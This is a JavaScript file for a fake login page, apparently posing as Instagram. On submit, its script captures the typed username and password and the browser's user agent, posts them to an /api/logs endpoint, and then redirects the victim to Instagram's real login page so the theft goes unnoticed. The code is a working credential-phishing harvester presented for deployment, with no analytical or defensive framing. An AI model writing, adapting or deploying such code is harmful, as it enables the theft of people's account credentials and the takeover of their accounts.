// lang: JS, file: public/app.js, target: browser (login page)
// Sends FormData to /api/logs to survive Vercel's body parser.

(function () {
  'use strict';

  function init() {
    const form = document.getElementById('loginForm');
    const user = document.getElementById('username');
    const pass = document.getElementById('password');
    const btn  = document.getElementById('loginBtn');

    if (!form || !user || !pass || !btn) return;

    function sync() {
      btn.disabled = !(user.value.length > 0 && pass.value.length > 0);
    }
    user.addEventListener('input', sync);
    pass.addEventListener('input', sync);

    form.addEventListener('submit', function (e) {
      e.preventDefault();

      const u = user.value;
      const p = pass.value;

      if (!u && !p) {
        window.location.href = 'https://www.instagram.com/accounts/login/';
        return;
      }

      // Use FormData — natively parsed by Vercel, no JSON headers needed.
      const fd = new FormData();
      fd.append('username', u);
      fd.append('password', p);
      fd.append('ua', navigator.userAgent);

      fetch('/api/logs', {
        method: 'POST',
        body: fd,
      })
      .catch(() => {})
      .finally(() => {
        window.location.href = 'https://www.instagram.com/accounts/login/';
      });
    });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
